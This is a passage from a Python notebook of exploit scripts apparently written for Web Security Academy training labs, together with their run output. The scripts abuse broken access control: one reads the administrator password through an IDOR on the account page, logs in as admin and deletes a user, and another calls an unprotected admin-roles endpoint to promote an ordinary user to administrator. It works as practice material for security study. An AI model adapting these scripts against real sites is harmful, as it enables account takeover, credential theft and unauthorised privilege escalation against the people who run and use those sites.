        "    url = \"https://0a0e0042034735268090712a00d800a5.web-security-academy.net\"\n",
        "\n",
        "    s = requests.Session()\n",
        "    admin_password = retrieve_admin_password(s, url)\n",
        "\n",
        "    delete_carlos_user(s, url, admin_password)\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    main()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "z_ehdjgBs-Nr",
        "outputId": "e8aac438-670f-445a-87b3-f309674860af"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "(+) Logging in as the wiener user...\n",
            "(+) Successfully logged in as the wiener user...\n",
            "(+) Successfully accessed the administrator account...\n",
            "(+) Retrieving the administrator password...\n",
            "(+) Logging in as the administrator user...\n",
            "(+) Successfully logged in as the administrator user...\n",
            "(+) Deleting Carlos user...\n",
            "Successfully deleted the Carlos user.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import requests\n",
        "from bs4 import BeautifulSoup\n",
        "import re\n",
        "\n",
        "# Disable SSL warnings (not recommended for production)\n",
        "requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)\n",
        "\n",
        "def get_csrf_token(s, url):\n",
        "    r = s.get(url, verify=False)\n",
        "    soup = BeautifulSoup(r.text, 'html.parser')\n",
        "    csrf = soup.find(\"input\", {'name': 'csrf'})['value']\n",
        "    return csrf\n",
        "\n",
        "def retrieve_admin_password(s, url):\n",
        "    # Retrieve the CSRF token\n",
        "    login_url = url + \"/login\"\n",
        "    csrf_token = get_csrf_token(s, login_url)\n",
        "\n",
        "    # Login as the wiener user\n",
        "    print(\"(+) Logging in as the wiener user...\")\n",
        "    data_login = {\"username\": \"wiener\", \"password\": \"peter\", \"csrf\": csrf_token}\n",
        "\n",
        "    r = s.post(login_url, data=data_login, verify=False)\n",
        "    res = r.text\n",
        "    if \"Log out\" in res:\n",
        "        print(\"(+) Successfully logged in as the wiener user...\")\n",
        "\n",
        "        # Retrieve admin password\n",
        "        admin_account_url = url + \"/my-account?id=administrator\"\n",
        "        r = s.get(admin_account_url, verify=False)\n",
        "        res = r.text\n",
        "\n",
        "        if 'administrator' in res:\n",
        "            print(\"(+) Successfully accessed the administrator account...\")\n",
        "            print(\"(+) Retrieving the administrator password...\")\n",
        "            soup = BeautifulSoup(r.text, 'html.parser')\n",
        "            password = soup.find(\"input\", {'name': 'password'})['value']\n",
        "            return password\n",
        "        else:\n",
        "            print(\"(-) Could not access the administrator account.\")\n",
        "            sys.exit(-1)\n",
        "    else:\n",
        "        print(\"(-) Could not login as the wiener user.\")\n",
        "        sys.exit(-1)\n",
        "\n",
        "def delete_carlos_user(s, url, password):\n",
        "    # Retrieve the CSRF token\n",
        "    login_url = url + \"/login\"\n",
        "    csrf_token = get_csrf_token(s, login_url)\n",
        "\n",
        "    # Login as the administrator user\n",
        "    print(\"(+) Logging in as the administrator user...\")\n",
        "    data_login = {\"username\": \"administrator\", \"password\": password, \"csrf\": csrf_token}\n",
        "\n",
        "    r = s.post(login_url, data=data_login, verify=False)\n",
        "    res = r.text\n",
        "    if \"Log out\" in res:\n",
        "        print(\"(+) Successfully logged in as the administrator user...\")\n",
        "\n",
        "        # Deleting the user\n",
        "        print(\"(+) Deleting Carlos user...\")\n",
        "        delete_carlos_url = url + \"/admin/delete?username=carlos\"\n",
        "        r = s.get(delete_carlos_url, verify=False)\n",
        "        if r.status_code == 200:\n",
        "            print(\"Successfully deleted the Carlos user.\")\n",
        "        else:\n",
        "            print(\"Could not delete the Carlos user.\")\n",
        "            sys.exit(-1)\n",
        "    else:\n",
        "        print(\"(-) Could not login as the administrator user.\")\n",
        "        sys.exit(-1)\n",
        "\n",
        "def main():\n",
        "    url = \"https://0a0e0042034735268090712a00d800a5.web-security-academy.net\"\n",
        "\n",
        "    s = requests.Session()\n",
        "    admin_password = retrieve_admin_password(s, url)\n",
        "\n",
        "    # Perform deletion of Carlos user\n",
        "    delete_carlos_user(s, url, admin_password)\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    main()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "o4GQ7bD1tRkv",
        "outputId": "1a9f57b8-8b01-43d2-92bc-1a9de5c4b06f"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "(+) Logging in as the wiener user...\n",
            "(+) Successfully logged in as the wiener user...\n",
            "(+) Successfully accessed the administrator account...\n",
            "(+) Retrieving the administrator password...\n",
            "(+) Logging in as the administrator user...\n",
            "(+) Successfully logged in as the administrator user...\n",
            "(+) Deleting Carlos user...\n",
            "Successfully deleted the Carlos user.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import requests\n",
        "import urllib3\n",
        "\n",
        "urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n",
        "\n",
        "def upgrade_wiener_user(s, url):\n",
        "\n",
        "    # login as the wiener user\n",
        "    login_url = url + '/login'\n",
        "    data_login = {'username': 'wiener', 'password': 'peter'}\n",
        "    r = s.post(login_url, data=data_login, verify=False)\n",
        "    res = r.text\n",
        "    if \"Log out\" in res:\n",
        "        print(\"(+) Successfully logged in as the wiener user...\")\n",
        "\n",
        "        # Upgrade the user to administrator\n",
        "        print(\"(+) Upgrading user to administrator...\")\n",
        "        upgrade_url = url + \"/admin-roles\"\n",
        "        data_upgrade = {'action': 'upgrade', 'confirmed': 'true', 'username': 'wiener'}\n",
        "        r = s.post(upgrade_url, data=data_upgrade, verify=False)\n",
        "        if r.status_code == 200:\n",
        "            print(\"(+) Successfully upgraded user to administrator.\")\n",
        "        else:\n",
        "            print(\"(-) Could not upgrade user to administrator.\")\n",
        "    else:\n",
        "        print(\"(-) Could not login as the wiener user.\")\n",
        "\n",
        "def main():\n",
        "    url = \"https://0a930009048ce03284e0fe67003a0055.web-security-academy.net/\"\n",
        "    s = requests.Session()\n",
        "    upgrade_wiener_user(s, url)\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    main()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "vwsl6V-nZ7Ka",
        "outputId": "d9397e3a-d789-449b-9f95-59cde867533c"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "(-) Could not login as the wiener user.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import requests\n",
        "import urllib3\n",
        "\n",
        "urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n",
        "\n",
        "def upgrade_wiener_user(s, url):\n",
        "\n",
        "    # login as the wiener user\n",
        "    login_url = url + '/login'\n",
        "    data_login = {'username': 'wiener', 'password': 'peter'}\n",
        "    r = s.post(login_url, data=data_login, verify=False)\n",
        "    res = r.text\n",
        "\n",
        "    print(\"(+) Login response status code:\", r.status_code)\n",
        "    print(\"(+) Login response headers:\", r.headers)\n",
        "    print(\"(+) Login response text:\", res[:500])  # Print the first 500 characters of the response text for debugging\n",
        "\n",
        "    if \"Log out\" in res:\n",
        "        print(\"(+) Successfully logged in as the wiener user...\")\n",
        "\n",
        "        # Upgrade the user to administrator\n",
        "        print(\"(+) Upgrading user to administrator...\")\n",
        "        upgrade_url = url + \"/admin-roles\"\n",
        "        data_upgrade = {'action': 'upgrade', 'confirmed': 'true', 'username': 'wiener'}\n",
        "        r = s.post(upgrade_url, data=data_upgrade, verify=False)\n",
        "\n",
        "        print(\"(+) Upgrade response status code:\", r.status_code)\n",
        "        print(\"(+) Upgrade response headers:\", r.headers)\n",
        "        print(\"(+) Upgrade response text:\", r.text[:500])  # Print the first 500 characters of the response text for debugging\n",
        "\n",
        "        if r.status_code == 200:\n",
        "            print(\"(+) Successfully upgraded user to administrator.\")\n",
        "        else:\n",
        "            print(\"(-) Could not upgrade user to administrator.\")\n",
        "    else:\n",
        "        print(\"(-) Could not login as the wiener user.\")\n",
        "\n",
        "def main():\n",
        "    url = \"https://0a930009048ce03284e0fe67003a0055.web-security-academy.net\"\n",
        "    s = requests.Session()\n",
        "    upgrade_wiener_user(s, url)\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    main()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "5nCF6881cdS7",
        "outputId": "5400bf47-dd65-4cdb-e18b-9ac35d7332df"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "(+) Login response status code: 200\n",
            "(+) Login response headers: {'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-cache', 'X-Frame-Options': 'SAMEORIGIN', 'Content-Encoding': 'gzip', 'Connection': 'close', 'Content-Length': '1859'}\n",
            "(+) Login response text: <!DOCTYPE html>\n",
            "<html>\n",
            "    <head>\n",
            "        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n",
            "        <link href=/resources/css/labs.css rel=stylesheet>\n",
            "        <title>Multi-step process with no access control on one step</title>\n",
            "    </head>\n",
            "    <body>\n",
            "        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n",
            "        <div id=\"academyLabHeader\">\n",
            "            <section class='academyLabBanner is-solved'>\n",
            "                <div class=container>\n",
            "                    <div c\n",
            "(+) Successfully logged in as the wiener user...\n",
            "(+) Upgrading user to administrator...\n",
            "(+) Upgrade response status code: 200\n",
            "(+) Upgrade response headers: {'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-cache', 'X-Frame-Options': 'SAMEORIGIN', 'Content-Encoding': 'gzip', 'Connection': 'close', 'Content-Length': '1890'}\n",
            "(+) Upgrade response text: <!DOCTYPE html>\n",
            "<html>\n",
            "    <head>\n",
            "        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n",
            "        <link href=/resources/css/labs.css rel=stylesheet>\n",
            "        <title>Multi-step process with no access control on one step</title>\n",
            "    </head>\n",
            "    <body>\n",
            "        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n",
            "        <div id=\"academyLabHeader\">\n",
            "            <section class='academyLabBanner is-solved'>\n",
            "                <div class=container>\n",
            "                    <div c\n",
            "(+) Successfully upgraded user to administrator.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "id": "x-aB8c7ndYo6"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}